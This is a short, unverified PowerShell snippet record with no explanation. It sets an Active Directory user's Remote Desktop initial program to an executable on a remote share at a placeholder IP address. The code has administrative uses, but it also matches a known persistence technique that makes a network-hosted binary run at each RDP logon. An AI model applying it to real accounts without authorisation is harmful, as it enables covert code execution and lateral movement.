---
id: 4bc1ad1f-77a5-4504-a7ea-83091000be72
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:06.779274+00:00'
updated_at: '2023-04-10T20:26:00.146215+00:00'
---

# Code Snippet 4bc1ad1f

**Language**: Powershell

```powershell
$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
$UserObject.TerminalServicesWorkDirectory = "C:\"
$UserObject.SetInfo()
```
